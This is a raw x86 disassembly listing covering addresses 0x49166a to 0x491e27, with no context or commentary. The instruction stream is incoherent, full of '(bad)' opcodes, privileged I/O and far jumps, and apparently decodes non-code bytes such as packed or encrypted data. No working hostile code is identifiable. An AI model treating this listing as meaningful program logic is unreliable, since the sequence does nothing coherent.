  49166a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49166b:	and    BYTE PTR [ebx],bl
  49166d:	dec    eax
  49166e:	or     al,0x33
  491670:	add    DWORD PTR [ebp+eax*1+0x3b0158dc],0x97b7600a
  49167b:	rol    DWORD PTR [edx+0x1908b160],0x52
  491682:	inc    ebx
  491683:	adc    bh,BYTE PTR [esi]
  491685:	mov    dl,cl
  491687:	clc    
  491688:	sbb    BYTE PTR [ecx],ch
  49168a:	sti    
  49168b:	int    0x2b
  49168d:	call   0x749191cd
  491692:	dec    ebx
  491693:	or     DWORD PTR [eax],0x24
  491696:	adc    dh,bh
  491698:	lods   eax,DWORD PTR ds:[esi]
  491699:	add    eax,0x3b16060a
  49169e:	jae    0x4916e8
  4916a0:	jne    0x4916a9
  4916a2:	call   0x1488229a
  4916a7:	inc    ebx
  4916a8:	dec    eax
  4916a9:	jno    0x49170e
  4916ab:	leave  
  4916ac:	adc    BYTE PTR [ebx+0x2134d46],dh
  4916b2:	add    bl,BYTE PTR [edi+0x1ff56684]
  4916b8:	dec    esp
  4916b9:	dec    ebx
  4916ba:	ins    DWORD PTR es:[edi],dx
  4916bb:	add    al,0x18
  4916bd:	mov    BYTE PTR [edi],al
  4916bf:	adc    eax,0xe14415e
  4916c4:	adc    eax,0x693888fc
  4916c9:	pop    ss
  4916ca:	popa   
  4916cb:	and    eax,0xcf1ce71
  4916d0:	cmp    ecx,ebx
  4916d2:	push   ecx
  4916d3:	jnp    0x4916a7
  4916d5:	xor    eax,DWORD PTR [ecx+ecx*4]
  4916d8:	jmp    0x606a:0x502ed6a3
  4916df:	pop    eax
  4916e0:	aas    
  4916e1:	push   ds
  4916e2:	rcl    BYTE PTR [eax+0x2af4f706],cl
  4916e8:	sub    al,0x82
  4916ea:	xchg   esi,eax
  4916eb:	in     al,dx
  4916ec:	mov    ch,0xbb
  4916ee:	or     eax,0x8201025c
  4916f3:	test   BYTE PTR [edi],ch
  4916f5:	(bad)  
  4916f6:	sti    
  4916f7:	fstp   st(0)
  4916f9:	dec    esp
  4916fa:	add    ch,BYTE PTR [ebx+0x25017fdb]
  491700:	xchg   edx,eax
  491701:	pop    edi
  491702:	sbb    bh,ah
  491704:	and    al,0x25
  491706:	test   DWORD PTR [edx],eax
  491708:	mov    cl,0xa9
  49170a:	pusha  
  49170b:	xor    DWORD PTR [ebx+0x702b7413],edi
  491711:	hlt    
  491712:	xchg   ebp,eax
  491713:	add    eax,0x8e864987
  491718:	push   esp
  491719:	sub    BYTE PTR [edi+0x1b],bl
  49171c:	push   cs
  49171d:	or     DWORD PTR [ebp+eiz*1-0x6e],ebx
  491721:	inc    ebp
  491722:	mov    DWORD PTR ds:0x2308b010,0xd7259713
  49172c:	mov    cl,0x2f
  49172e:	nop
  49172f:	push   eax
  491730:	jb     0x49173a
  491732:	and    DWORD PTR [ecx+eax*1-0x59f99fed],esi
  491739:	es daa 
  49173b:	sub    eax,0x49a4253d
  491740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491741:	jmp    0x49175d
  491743:	cmp    eax,DWORD PTR [edi+ebx*8-0x29631121]
  49174a:	and    DWORD PTR [eax],ebx
  49174c:	mov    dx,0xb01d
  491750:	gs (bad) 
  491752:	and    BYTE PTR [esi+0x11],bh
  491755:	dec    edx
  491756:	mov    eax,ds:0x9544f47
  49175b:	scas   eax,DWORD PTR es:[edi]
  49175c:	enter  0x764f,0x8d
  491760:	inc    ebx
  491761:	push   esp
  491762:	into   
  491763:	xchg   DWORD PTR ds:0xd3c561dc,esp
  491769:	sar    esp,0xd2
  49176c:	lahf   
  49176d:	pop    esi
  49176e:	jmp    0x4917c2
  491770:	sbb    ebx,DWORD PTR [edx+ebp*4-0x736457be]
  491777:	sub    eax,0xd700134e
  49177c:	les    ebp,FWORD PTR [eax+0x4b]
  49177f:	dec    ecx
  491780:	mov    ds:0xf92d4d0,eax
  491785:	cmp    edx,DWORD PTR [ebx]
  491787:	mov    eax,ds:0x3c50ba51
  49178c:	mov    ebp,0x8c180aad
  491791:	lahf   
  491792:	hlt    
  491793:	(bad)  
  491794:	sbb    esi,esp
  491796:	pop    ds
  491797:	cmp    cl,BYTE PTR [esi]
  491799:	or     DWORD PTR [edx],edi
  49179b:	add    eax,0x34e46d9c
  4917a0:	cmp    bl,BYTE PTR [eax+0xb]
  4917a3:	xor    BYTE PTR [ecx+0x6e540f1d],bh
  4917a9:	sbb    eax,0x8cd34f84
  4917ae:	mov    al,ds:0x56d71c14
  4917b3:	sub    al,0xed
  4917b5:	ja     0x491813
  4917b7:	out    0x2b,al
  4917b9:	(bad)  
  4917ba:	mov    bh,0xf0
  4917bc:	pop    ebx
  4917bd:	out    0x57,eax
  4917bf:	xchg   esp,eax
  4917c0:	and    BYTE PTR [edx+0x2],bl
  4917c3:	out    0x6c,eax
  4917c5:	sub    DWORD PTR ds:0x525c9088,ebp
  4917cb:	xor    DWORD PTR [edi],esi
  4917cd:	push   ecx
  4917ce:	pop    ebp
  4917cf:	or     eax,0x5523ef02
  4917d4:	add    edx,DWORD PTR [ebp-0x29]
  4917d7:	test   eax,0x502783ce
  4917dc:	inc    ecx
  4917dd:	and    BYTE PTR [esi],bl
  4917df:	adc    BYTE PTR [edi+0x19],ch
  4917e2:	inc    di
  4917e4:	push   ecx
  4917e6:	stos   BYTE PTR es:[edi],al
  4917e7:	mov    ah,BYTE PTR [eax-0x4ebdf222]
  4917ed:	push   ebp
  4917ee:	adc    al,0x58
  4917f0:	pop    esi
  4917f1:	out    dx,eax
  4917f2:	xchg   esi,eax
  4917f3:	sbb    eax,0x261f5ff7
  4917f8:	aas    
  4917f9:	test   dl,al
  4917fb:	jne    0x49180a
  4917fd:	nop
  4917fe:	and    eax,0x1f1a6ecc
  491803:	jb     0x49182a
  491805:	outs   dx,DWORD PTR ds:[esi]
  491806:	pop    edi
  491807:	pop    edx
  491808:	mov    eax,0xf5c72601
  49180d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49180e:	push   0x48c0dfb4
  491813:	sbb    BYTE PTR [edx+0xb],0xb3
  491817:	mov    al,ds:0x8a878966
  49181c:	jbe    0x491842
  49181e:	jle    0x491832
  491820:	mov    edx,0xbf49899f
  491825:	mov    cl,BYTE PTR [edi+eax*4-0x17]
  491829:	push   ebp
  49182a:	pop    es
  49182b:	pop    ecx
  49182c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49182d:	(bad)  
  49182e:	callw  0xaabd
  491832:	adc    edx,DWORD PTR [eax+0x35]
  491835:	loopne 0x49184b
  491837:	fisttp QWORD PTR [edi+0x505c4c51]
  49183d:	jnp    0x49189f
  49183f:	data16 (bad) 
  491841:	sub    al,0xf9
  491843:	pusha  
  491844:	or     bh,cl
  491846:	add    DWORD PTR [edi+0x3f],ecx
  491849:	loopne 0x491850
  49184b:	loope  0x491892
  49184d:	popa   
  49184e:	mov    al,ds:0xb0a2e1a
  491853:	mov    ds:0x5d87c7b9,eax
  491858:	neg    BYTE PTR [ebx-0x40ebbba7]
  49185e:	inc    eax
  49185f:	out    dx,eax
  491860:	leave  
  491861:	adc    bl,BYTE PTR [ebp-0x66855924]
  491867:	stc    
  491868:	mov    ebx,0xc84a985
  49186d:	and    eax,0x3bd38ee9
  491872:	push   ebp
  491873:	adc    ebp,DWORD PTR [ebx]
  491875:	neg    BYTE PTR [esi+0x60]
  491878:	jne    0x4918aa
  49187a:	xchg   ebp,eax
  49187b:	dec    esp
  49187c:	adc    al,0xfc
  49187e:	repz mov eax,ds:0x640407c1
  491884:	jns    0x491856
  491886:	jg     0x491812
  491888:	inc    esi
  491889:	pop    eax
  49188a:	mov    ch,dh
  49188c:	sub    al,0xa
  49188e:	outs   dx,BYTE PTR es:[esi]
  491890:	fwait
  491891:	and    BYTE PTR [eax+0x24],ah
  491894:	xchg   esi,eax
  491895:	jl     0x491876
  491897:	jo     0x4918de
  491899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49189a:	jo     0x4918cc
  49189c:	sar    BYTE PTR [eax+0xe],0x2e
  4918a0:	sub    BYTE PTR [ecx],cl
  4918a2:	cmp    DWORD PTR [edx],0x8d9890ca
  4918a8:	adc    eax,eax
  4918aa:	mov    edx,0x27590b41
  4918af:	rcr    dl,0xdb
  4918b2:	fwait
  4918b3:	popa   
  4918b4:	and    DWORD PTR [edx-0x76777786],ecx
  4918ba:	clc    
  4918bb:	push   ds
  4918bc:	mov    esp,0x554e16f
  4918c1:	in     eax,dx
  4918c2:	lock add eax,0x816d0533
  4918c8:	call   0xf074:0x4f459402
  4918cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4918d0:	sub    al,0xa0
  4918d2:	and    eax,ebp
  4918d4:	pusha  
  4918d5:	imul   eax,DWORD PTR [ecx-0x45],0xe4beb28
  4918dc:	pop    ds
  4918dd:	push   edx
  4918de:	pop    edi
  4918df:	lock mov al,BYTE PTR [ebx+0x5bad01c5]
  4918e6:	adc    al,0x6
  4918e8:	or     ebp,edx
  4918ea:	and    eax,0x4b0f8e02
  4918ef:	les    ebx,FWORD PTR ds:0xb021dbe9
  4918f5:	pusha  
  4918f6:	sub    bh,BYTE PTR [ebp-0x4c9520f0]
  4918fc:	retf   
  4918fd:	xor    esi,DWORD PTR [esi-0x20]
  491900:	cwde   
  491901:	inc    ecx
  491902:	sti    
  491903:	sub    BYTE PTR [ecx+0x53],al
  491906:	or     DWORD PTR [eax+0x5],ebx
  491909:	mov    ecx,0x1622da6
  49190e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49190f:	pop    ss
  491910:	pop    esp
  491911:	call   0x6c757eb5
  491916:	pop    es
  491917:	outs   dx,BYTE PTR ds:[esi]
  491918:	xlat   BYTE PTR ds:[ebx]
  491919:	mov    ch,0xb
  49191b:	mov    ?,WORD PTR [ebp+0x1830d4a0]
  491921:	daa    
  491922:	xchg   esp,eax
  491923:	pop    eax
  491924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491925:	push   es
  491926:	inc    esi
  491927:	or     BYTE PTR [ecx],ch
  491929:	pop    eax
  49192a:	aas    
  49192b:	push   edx
  49192c:	aam    0x58
  49192e:	repz scas al,BYTE PTR es:[edi]
  491930:	add    DWORD PTR [ecx+0x36],ebp
  491933:	aad    0x6c
  491935:	xlat   BYTE PTR ds:[ebx]
  491936:	fisttp WORD PTR [esi+0x2]
  491939:	push   edx
  49193a:	inc    eax
  49193b:	sbb    eax,0xdf41e8c1
  491940:	xchg   eax,ebx
  491942:	or     eax,0xfee80bb0
  491947:	and    eax,0xd0bc9800
  49194c:	jo     0x491998
  49194e:	loopne 0x491963
  491950:	ds (bad) 
  491952:	or     DWORD PTR [edx-0x42],eax
  491955:	stos   BYTE PTR es:[edi],al
  491956:	loop   0x491959
  491958:	fisub  WORD PTR [eax]
  49195a:	dec    ecx
  49195b:	jecxz  0x49195f
  49195d:	xchg   ch,al
  49195f:	xor    al,0x6d
  491961:	in     al,dx
  491962:	or     dh,ch
  491964:	mov    cl,0x53
  491966:	ss lock clc 
  491969:	outs   dx,BYTE PTR ds:[esi]
  49196a:	ja     0x49190d
  49196c:	imul   esi,DWORD PTR [edi-0x2794c5b3],0x23b8c907
  491976:	mov    esp,0x401a473a
  49197b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49197c:	sub    BYTE PTR [esi+0x5d],al
  49197f:	dec    DWORD PTR [edi-0x23c4a700]
  491985:	push   cs
  491986:	imul   edi,edx
  491989:	add    edi,0x1f
  49198c:	and    edi,0xffffffe0
  49198f:	dec    esi
  491990:	inc    edx
  491991:	outs   dx,DWORD PTR ds:[esi]
  491992:	mov    BYTE PTR [ebp+0x7c7f6ff],0xc1
  491999:	call   esi
  49199b:	outs   dx,BYTE PTR ds:[esi]
  49199c:	ret    
  49199d:	mov    edx,0x84f7286b
  4919a2:	into   
  4919a3:	xchg   esp,eax
  4919a4:	addr16 loopne 0x4919a8
  4919a7:	dec    edx
  4919a8:	clc    
  4919a9:	iret   
  4919aa:	mov    eax,ds:0x22383504
  4919af:	out    0x80,eax
  4919b1:	imul   ebp,DWORD PTR [eax+0x60],0x42
  4919b5:	jbe    0x4919d4
  4919b7:	xchg   BYTE PTR [ecx],bh
  4919b9:	ror    BYTE PTR ds:0x2c5322bb,cl
  4919bf:	adc    DWORD PTR [eax],edi
  4919c1:	push   esi
  4919c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4919c3:	lods   al,BYTE PTR ds:[esi]
  4919c4:	mov    dh,0x35
  4919c6:	in     al,0x45
  4919c8:	(bad)  
  4919c9:	xor    al,0xa1
  4919cb:	lahf   
  4919cc:	shl    BYTE PTR [edx+0x2c29e011],cl
  4919d2:	adc    DWORD PTR [ebx+0x5ab8f569],eax
  4919d8:	sbb    bl,BYTE PTR [ecx+0x4fae6904]
  4919de:	(bad)  
  4919df:	fst    st(5)
  4919e1:	inc    esp
  4919e2:	or     eax,0xe84545e7
  4919e7:	mov    bh,0xb4
  4919e9:	stos   DWORD PTR es:[edi],eax
  4919ea:	mov    ah,0xfb
  4919ec:	in     al,0x19
  4919ee:	pop    ebp
  4919ef:	faddp  st(5),st
  4919f1:	and    BYTE PTR [eax],dh
  4919f3:	jne    0x4919b5
  4919f5:	scas   eax,DWORD PTR es:[edi]
  4919f6:	mov    esp,0xa402385e
  4919fb:	adc    DWORD PTR [esi],0x10
  4919fe:	out    dx,al
  4919ff:	mov    bh,BYTE PTR [ebx+0xeddb0d5]
  491a05:	push   ds
  491a06:	lods   al,BYTE PTR ds:[esi]
  491a07:	nop
  491a08:	mov    esi,0x74d84193
  491a0d:	sub    ah,BYTE PTR [edi]
  491a0f:	inc    edi
  491a10:	adc    BYTE PTR es:[esi],ch
  491a13:	xor    ecx,ebx
  491a15:	es pop esi
  491a17:	js     0x491a64
  491a19:	aam    0x88
  491a1b:	test   al,0x14
  491a1d:	in     al,0x36
  491a1f:	imul   ecx,DWORD PTR [ecx+0xc773b82],0x3b52db3d
  491a29:	mov    al,ds:0x6d87780d
  491a2e:	add    eax,0x643f9d15
  491a33:	test   al,0xd
  491a35:	data16 add di,WORD PTR [edx]
  491a39:	ins    DWORD PTR es:[edi],dx
  491a3a:	jmp    0x491a1b
  491a3c:	add    al,0x65
  491a3e:	xchg   edi,eax
  491a3f:	or     DWORD PTR fs:[edi+esi*2],ecx
  491a43:	leave  
  491a44:	lds    esp,FWORD PTR [ecx]
  491a46:	inc    ebx
  491a47:	dec    ecx
  491a48:	out    0x2c,eax
  491a4a:	add    DWORD PTR [ebx],ebp
  491a4c:	or     BYTE PTR [ecx],ah
  491a4e:	loopne 0x4919f7
  491a50:	and    ebx,ecx
  491a52:	dec    ebp
  491a53:	int3   
  491a54:	test   eax,0x9ba190f0
  491a59:	inc    ebp
  491a5a:	data16 add cl,BYTE PTR [ebx-0x45edb902]
  491a61:	loopne 0x491ada
  491a63:	xchg   ebp,eax
  491a64:	mov    ebp,DWORD PTR [ecx+eiz*8+0x150c1e48]
  491a6b:	inc    ebp
  491a6c:	mov    DWORD PTR [edi-0x67],0xf6053e43
  491a73:	jo     0x491ae9
  491a75:	xchg   esp,eax
  491a76:	add    dh,BYTE PTR [esi]
  491a78:	pushf  
  491a79:	or     ah,BYTE PTR [ecx]
  491a7b:	dec    ecx
  491a7c:	test   al,0xea
  491a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491a7f:	jg     0x491aa2
  491a81:	mov    al,ds:0x7228158b
  491a86:	sub    edi,DWORD PTR ds:0x35225dfc
  491a8c:	enter  0x695e,0x9e
  491a90:	sbb    BYTE PTR [ebx],al
  491a92:	pushf  
  491a93:	xchg   edi,eax
  491a94:	shl    BYTE PTR [edi+0x48],0xf0
  491a98:	mov    eax,0x1fe7ed88
  491a9d:	dec    eax
  491a9e:	out    dx,eax
  491a9f:	inc    ebp
  491aa0:	xchg   esp,eax
  491aa1:	push   ss
  491aa2:	(bad)  [ebx]
  491aa4:	gs cld 
  491aa6:	add    al,0x50
  491aa8:	jle    0x491ac4
  491aaa:	mov    ds:0x451f02ce,al
  491aaf:	mov    eax,0x4131d2c
  491ab4:	cmp    al,BYTE PTR [eax]
  491ab6:	cmp    eax,0xca652081
  491abb:	mov    DWORD PTR [ebp-0x2913f92a],ecx
  491ac1:	inc    edx
  491ac2:	and    ah,BYTE PTR [edi-0x54]
  491ac5:	(bad)  
  491ac6:	dec    ebp
  491ac7:	fstp   DWORD PTR [esi]
  491ac9:	jno    0x491a5b
  491acb:	add    DWORD PTR [esi],ecx
  491acd:	or     eax,0xd74d4d78
  491ad2:	sub    BYTE PTR [eax+0xb45c51],dh
  491ad8:	and    BYTE PTR [edi-0x13],0x7c
  491adc:	and    dl,BYTE PTR [edx]
  491ade:	in     eax,0x80
  491ae0:	lea    edi,[ebp-0x48]
  491ae3:	sub    al,0xec
  491ae5:	xor    BYTE PTR [eax+ebp*1-0x6fdb44d4],bl
  491aec:	lea    eax,[ebx+0xde72763]
  491af2:	or     DWORD PTR [edi],ecx
  491af4:	sub    eax,DWORD PTR [ebx+0x3f]
  491af7:	test   al,0x20
  491af9:	test   edi,ebp
  491afb:	jmp    0x491b2c
  491afd:	cs jo  0x491b60
  491b00:	cmp    eax,0x568196ba
  491b05:	jl     0x491a8a
  491b07:	push   esp
  491b08:	rol    BYTE PTR [eax-0x6fd7252f],1
  491b0e:	push   0x989d0cbc
  491b13:	push   edx
  491b14:	xor    DWORD PTR [eax],0xffffffda
  491b17:	and    esi,DWORD PTR [ecx]
  491b19:	or     al,0xec
  491b1b:	xor    esp,edx
  491b1d:	jo     0x491ac3
  491b1f:	mov    bh,BYTE PTR [eax+0x1666788d]
  491b25:	int    0x35
  491b27:	neg    ebx
  491b29:	sar    BYTE PTR [edi-0x370dda7b],0x11
  491b30:	(bad)  
  491b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491b33:	adc    BYTE PTR [esp+ecx*8-0x73],bh
  491b37:	xchg   ebp,eax
  491b38:	jo     0x491b7d
  491b3a:	jno    0x491b00
  491b3c:	imul   ebp,esi,0x2a1f857a
  491b42:	je     0x491aca
  491b44:	pushf  
  491b45:	sbb    BYTE PTR [esi-0x31],0x42
  491b49:	adc    eax,0x319aa300
  491b4e:	pop    edx
  491b4f:	aaa    
  491b50:	rcr    BYTE PTR [ebx+0x74],1
  491b53:	push   cs
  491b54:	aam    0x99
  491b56:	push   cs
  491b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491b58:	test   al,0xc4
  491b5a:	mov    ebx,0x22dc29e8
  491b5f:	push   eax
  491b60:	(bad)  
  491b61:	shl    BYTE PTR [eax],cl
  491b63:	xchg   esp,eax
  491b64:	xor    DWORD PTR [edx+0x12],eax
  491b67:	mov    cl,0x4
  491b69:	dec    ebx
  491b6a:	loop   0x491af1
  491b6c:	jmp    0x7593:0xe37d80e3
  491b73:	mov    ecx,0x18af20a1
  491b78:	pop    ecx
  491b79:	pop    esp
  491b7a:	jecxz  0x491b9f
  491b7c:	or     cl,BYTE PTR [esi]
  491b7e:	pusha  
  491b7f:	or     al,0x33
  491b81:	xchg   edx,eax
  491b82:	xor    al,0xde
  491b84:	mov    bh,0x2e
  491b86:	dec    esi
  491b87:	in     eax,0x96
  491b89:	xor    bl,ah
  491b8b:	push   ecx
  491b8c:	shl    DWORD PTR [edx+0x1c62b8b1],cl
  491b92:	mov    BYTE PTR [edx+0x58],al
  491b95:	xchg   esp,eax
  491b96:	into   
  491b97:	stos   DWORD PTR es:[edi],eax
  491b98:	mov    edx,0x481f2b5e
  491b9d:	test   al,0xd8
  491b9f:	adc    dl,BYTE PTR ds:0x3985f781
  491ba5:	push   edx
  491ba6:	clc    
  491ba7:	sbb    al,0x3
  491ba9:	lock pop ecx
  491bab:	rep ins DWORD PTR es:[edi],dx
  491bad:	pusha  
  491bae:	shl    DWORD PTR [ebp+0x68370308],1
  491bb4:	mov    WORD PTR ds:0x4ca41260,gs
  491bba:	xchg   ebp,eax
  491bbb:	mov    dh,0x5
  491bbd:	mov    esi,0xdd89e29
  491bc2:	cmc    
  491bc3:	sub    eax,0x9e1ce35
  491bc8:	test   al,0x40
  491bca:	or     BYTE PTR [ebx+0x78],bh
  491bcd:	inc    ebx
  491bce:	pop    edi
  491bcf:	dec    ebp
  491bd0:	or     edi,ecx
  491bd2:	mov    ebx,0xc413d102
  491bd7:	fadd   DWORD PTR [eax+ebx*1]
  491bda:	call   0x2905:0xc02c49dd
  491be1:	push   esp
  491be2:	add    al,0x98
  491be4:	scas   eax,DWORD PTR es:[edi]
  491be5:	test   bl,0x3b
  491be8:	fs mov eax,0xb3951278
  491bee:	push   eax
  491bef:	adc    BYTE PTR fs:[esi],al
  491bf2:	nop
  491bf3:	popa   
  491bf4:	xchg   edi,eax
  491bf5:	jl     0x491c5f
  491bf7:	dec    ebp
  491bf8:	shr    BYTE PTR [ebx+eax*8-0x5b],0xb0
  491bfd:	inc    ecx
  491bfe:	jo     0x491beb
  491c00:	mov    ah,0xf2
  491c02:	adc    eax,0x690f7818
  491c07:	popa   
  491c08:	lea    edx,[ebp-0x70]
  491c0b:	or     BYTE PTR [esi-0x5f2b58a8],ah
  491c11:	fstp   QWORD PTR [esi]
  491c13:	pop    eax
  491c14:	or     al,0xb0
  491c16:	(bad)  
  491c17:	jle    0x491c26
  491c19:	or     BYTE PTR [edi+ebx*8],0xda
  491c1d:	mov    al,0x85
  491c1f:	(bad)  
  491c20:	jmp    0x491c4b
  491c22:	scas   al,BYTE PTR es:[edi]
  491c23:	push   ebp
  491c24:	aam    0x1b
  491c26:	sbb    eax,DWORD PTR [ebx-0x71]
  491c29:	push   0x33
  491c2b:	mov    cl,0x51
  491c2d:	add    eax,0x9c6918a5
  491c32:	mov    eax,0xb0f7d338
  491c37:	jmp    0xda31:0xd8a583aa
  491c3e:	sub    eax,0xa72a0e69
  491c43:	xchg   edi,eax
  491c44:	adc    ebp,DWORD PTR [eax+0x5]
  491c47:	jl     0x491c9b
  491c49:	dec    ebx
  491c4a:	outs   dx,DWORD PTR ds:[esi]
  491c4b:	mov    ebx,0x80dc0f45
  491c50:	in     al,0x2a
  491c52:	push   cs
  491c53:	xchg   ebx,eax
  491c54:	adc    eax,0xf02284fb
  491c59:	mov    esi,0x1750561c
  491c5e:	jg     0x491c1d
  491c60:	pop    ebp
  491c61:	push   ebx
  491c62:	sbb    bh,BYTE PTR [ebx-0x7b]
  491c65:	js     0x491cd3
  491c67:	sub    ecx,DWORD PTR ds:0x53e40d1e
  491c6d:	dec    eax
  491c6e:	cwde   
  491c6f:	jg     0x491bf4
  491c71:	ds dec edx
  491c73:	out    0x48,eax
  491c75:	inc    esp
  491c76:	outs   dx,BYTE PTR ds:[esi]
  491c77:	inc    esp
  491c78:	cmp    edi,ebp
  491c7a:	je     0x491c91
  491c7c:	test   edx,eax
  491c7e:	mov    cs,ecx
  491c80:	mov    ah,0xed
  491c82:	aaa    
  491c83:	lds    ebx,FWORD PTR [ebx]
  491c85:	mov    eax,DWORD PTR [ebx+0x75b3a1d6]
  491c8b:	sub    al,0xc3
  491c8d:	push   es
  491c8e:	lods   eax,DWORD PTR ds:[esi]
  491c8f:	mov    cl,0xac
  491c91:	sbb    edx,DWORD PTR [ebx+0x15]
  491c94:	or     ah,BYTE PTR [eax+0x28]
  491c97:	xchg   BYTE PTR [eax],al
  491c99:	into   
  491c9a:	mov    ah,0xe
  491c9c:	push   edx
  491c9d:	or     eax,0xbf15b026
  491ca2:	ret    
  491ca3:	xor    BYTE PTR [ebp-0x2e],bh
  491ca6:	je     0x491c3e
  491ca8:	xor    eax,0xc2007f90
  491cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491cae:	or     cl,BYTE PTR [ecx+0x58]
  491cb1:	bswap  eax
  491cb3:	gs inc eax
  491cb5:	xchg   BYTE PTR [edi-0x36],cl
  491cb8:	int3   
  491cb9:	enter  0xe0,0x80
  491cbd:	punpckhbw mm5,mm4
  491cc0:	sbb    DWORD PTR [ebp+0x4d],eax
  491cc3:	mov    bl,0xa1
  491cc5:	xor    al,0x79
  491cc7:	clc    
  491cc8:	sbb    DWORD PTR [ebp-0x18],eax
  491ccb:	dec    eax
  491ccc:	adc    ah,BYTE PTR [esi]
  491cce:	in     eax,0x10
  491cd0:	sub    DWORD PTR [eax+0x6],esi
  491cd3:	enter  0xad00,0xd3
  491cd7:	in     al,0xc0
  491cd9:	bound  ecx,QWORD PTR gs:[ebx+ecx*1-0x80]
  491cde:	pusha  
  491cdf:	and    eax,DWORD PTR [eax]
  491ce1:	jl     0x491d56
  491ce3:	inc    ecx
  491ce4:	je     0x491c9c
  491ce6:	bound  esi,QWORD PTR [ebp+0x12]
  491ce9:	jbe    0x491cf6
  491ceb:	push   0x6
  491ced:	sub    DWORD PTR [edx+0x3a1071b],eax
  491cf3:	ret    0x9c40
  491cf6:	mov    ebp,0x9c0bbc45
  491cfb:	mov    DWORD PTR [edx],0x27f61a14
  491d01:	xchg   DWORD PTR [ebp-0x485ae33c],eax
  491d07:	popf   
  491d08:	pop    esp
  491d09:	retf   
  491d0a:	inc    edx
  491d0b:	sub    ecx,DWORD PTR [ebx]
  491d0d:	mov    BYTE PTR [edi+0x682be419],al
  491d13:	lahf   
  491d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491d15:	sbb    al,BYTE PTR [ebp+0x4c]
  491d18:	sbb    bl,ch
  491d1a:	add    ah,bl
  491d1c:	sub    al,0xcb
  491d1e:	add    eax,0xa4626e1c
  491d23:	fwait
  491d24:	mov    esp,0x253d5858
  491d29:	cmc    
  491d2a:	and    bl,BYTE PTR [esi]
  491d2c:	mov    eax,0x2c55762c
  491d31:	lea    eax,[eax-0x5140388f]
  491d37:	mov    WORD PTR [edi-0x42],gs
  491d3a:	shl    DWORD PTR [eax],1
  491d3c:	outs   dx,BYTE PTR ds:[esi]
  491d3d:	xchg   esp,eax
  491d3e:	sub    BYTE PTR ds:[eax+0x5451a44],bh
  491d45:	add    bh,ch
  491d47:	dec    edi
  491d48:	add    eax,0xe468c409
  491d4d:	sbb    eax,0x616f6382
  491d52:	push   edx
  491d53:	bound  ecx,QWORD PTR [edi+0x15c4ec6c]
  491d59:	add    al,0x64
  491d5b:	lods   al,BYTE PTR ds:[esi]
  491d5c:	xor    ah,BYTE PTR [edx+0x61]
  491d5f:	jb     0x491dbe
  491d61:	adc    eax,0x64ddc9f4
  491d66:	mov    dh,0x1b
  491d68:	in     al,dx
  491d69:	nop
  491d6a:	into   
  491d6b:	lds    ebp,FWORD PTR [esi+0x701f8001]
  491d71:	pop    ds
  491d72:	add    eax,0x4856d0f2
  491d77:	sub    cl,BYTE PTR [ebx]
  491d79:	push   esp
  491d7a:	pop    eax
  491d7b:	add    ah,BYTE PTR [ecx+0x3]
  491d7e:	mov    WORD PTR [eax-0x36],ss
  491d81:	imul   esp,DWORD PTR [esi-0x28],0x75819c48
  491d88:	out    dx,eax
  491d89:	pop    es
  491d8a:	and    DWORD PTR [eax-0x3f],eax
  491d8d:	push   esp
  491d8e:	jnp    0x491d49
  491d90:	(bad)  [ecx]
  491d92:	jp     0x491d24
  491d94:	stc    
  491d95:	xchg   edx,eax
  491d96:	inc    ecx
  491d97:	sahf   
  491d98:	pop    ss
  491d99:	lds    ebx,FWORD PTR [ebx]
  491d9b:	inc    ebp
  491d9c:	fs int3 
  491d9e:	sbb    eax,DWORD PTR [ebp+0x2b]
  491da1:	in     al,0x95
  491da3:	or     DWORD PTR [esp+0x1c],esp
  491da7:	inc    ebp
  491da8:	add    BYTE PTR [eax+0x1c],al
  491dab:	xchg   edx,eax
  491dac:	je     0x491dec
  491dae:	inc    edi
  491daf:	adc    al,dh
  491db1:	add    dh,al
  491db3:	imul   ebp,DWORD PTR [esi-0x2b],0xe110b5ae
  491dba:	into   
  491dbb:	test   BYTE PTR [edi-0x6afa2824],bh
  491dc1:	add    ch,bl
  491dc3:	out    dx,al
  491dc4:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  491dc6:	mov    bl,0xd9
  491dc8:	cld    
  491dc9:	outs   dx,BYTE PTR ds:[esi]
  491dca:	pop    es
  491dcb:	in     al,dx
  491dcc:	sbb    eax,0x1eb00045
  491dd1:	or     al,0x1f
  491dd3:	mov    ah,0x23
  491dd5:	fnstcw WORD PTR [edx+ebx*4+0x4f]
  491dd9:	sar    BYTE PTR [eax],1
  491ddb:	pop    ds
  491ddc:	lock test al,0x20
  491ddf:	pusha  
  491de0:	and    DWORD PTR [esi+ebx*4+0x66],edi
  491de4:	mov    bl,0x40
  491de6:	and    eax,0xd8782218
  491deb:	cmp    al,0x23
  491ded:	and    al,0xa9
  491def:	xchg   ebp,eax
  491df0:	fdiv   QWORD PTR [esi+ebp*1+0x40]
  491df4:	push   ss
  491df5:	rol    edx,1
  491df7:	push   0xffffffa7
  491df9:	sbb    DWORD PTR [ecx+ebp*8],esp
  491dfc:	mov    ah,0xb
  491dfe:	lahf   
  491dff:	(bad)  
  491e00:	out    0x4c,al
  491e02:	leave  
  491e03:	adc    ecx,DWORD PTR [edx+ebp*4]
  491e06:	dec    edi
  491e07:	(bad)  
  491e08:	cmp    BYTE PTR [eax*2+0x782cf82],bl
  491e0f:	mov    al,0x26
  491e11:	push   ds
  491e12:	fsub   QWORD PTR [esi]
  491e14:	daa    
  491e15:	inc    ebp
  491e16:	(bad)  
  491e17:	mov    bl,0x7d
  491e19:	test   DWORD PTR [eax+0x7e3e28b0],0x100629c4
  491e23:	sub    edx,DWORD PTR [edx+ecx*1+0x3e]
  491e27:	dec    edi
